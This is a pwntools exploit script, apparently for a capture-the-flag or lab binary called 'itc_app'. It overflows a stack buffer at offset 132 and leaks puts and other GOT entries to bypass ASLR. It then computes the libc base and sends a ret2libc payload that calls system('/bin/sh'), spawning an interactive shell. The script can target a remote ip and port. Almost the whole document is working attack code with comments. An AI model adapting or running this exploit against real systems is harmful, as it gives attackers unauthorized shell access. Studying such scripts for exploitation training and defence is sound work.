from pwn import *

# Allows you to switch between GDB/Remote/Local.
# Usage: python3 this_script.py GDB
#        python3 this_script.py REMOTE <ip> <port>
#        python3 this_script.py 
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# GDB script that is used for debugging.
gdbscript = '''
break main
continue
'''.format(**locals())

# Setting the path to executable.
exe = './itc_app'

# The context arch, bits, os and other.
elf = ELF(exe, checksec=False)

# Enable verbose logging (info/debug).
context.log_level = 'info'



###################################################################################################################################
# EXPLOIT
###################################################################################################################################

# Start program
io = start()

# Offset to EIP
offset = 132

# All addresses formatted using [::-1] to be in little endian form.
puts_plt = b"\x08\x04\x83\x40"[::-1]    #Address of puts@plt.
main = b"\x08\x04\x84\x7b"[::-1]        #Address of main.
puts_got = b"\x08\x04\x97\xac"[::-1]    #Address of puts@got.

# Payload to leak libc function.
# flat() is used to flatten all of the arguments into a string. Thus creating a single, string payload.
leak_payload = flat(
    b"\x90"*offset,    # Offset to the EIP.
    puts_plt,          # Address of puts@plt for puts function to be executed.
    main,              # Address of main to return to after puts completes.
    puts_got,          # Parameter 1: Address of the function pointer to the entry of puts in the GOT.
)

# Send the first payload to leak the address of "puts" after the user is prompted to provide input.
io.sendlineafter(b'Enter your Description\n', leak_payload)

# Receive all lines sent back to user until the required one, that contains the leaked addresses. 
# https://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recvlines
io.recvlines(3)

# Receive the line which contains the "puts" address and other addresses from the GOT.
# The functions of leaked addresses after "puts" were correlated using gdb.   
# https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass
leaked_addresses = (io.recvline(False))    # "False" truncates the end nullbyte.
puts = (leaked_addresses[:4])
libc_start_main = (leaked_addresses[4:8])
setvbuf = (leaked_addresses[8:12])

# Calculate the beginning of libc using the obtained offsets from the libc database.
beginning_libc_int = (int.from_bytes(libc_start_main, 'little') - 0x018550)
beginning_libc_bytes = beginning_libc_int.to_bytes(4, 'little')

print("-"*10,"Leaked Addresses","-"*10)
print("> Address of puts:", puts[::-1].hex())
print("> Address of libc_start_main:", libc_start_main[::-1].hex())
print("> Address of setvbuf:", setvbuf[::-1].hex())
print("\n> Beginning of libc:", beginning_libc_bytes[::-1].hex())
print("-"*38)



# After the addresses are leaked the exact version of libc can be deduced. 
# This let's us to calculate the location of "system()" and "/bin/sh".
system = (beginning_libc_int + 0x03adb0).to_bytes(4, 'little')
binsh = (beginning_libc_int + 0x15bb2b).to_bytes(4, 'little')

shell_payload = flat(
    b"\x90"*offset,    # Offset to the EIP.
    system,            # Address of system in libc (as calculated above).
    main,              # Address of main to return to after system completes.
    binsh              # Parameter 1: string of "/bin/sh" to be executed as a shell command.
)

# Send the second payload to spawn a shell using system("/bin/sh").
io.sendlineafter(b'Enter your Description\n', shell_payload)



# Got Shell?
io.interactive()
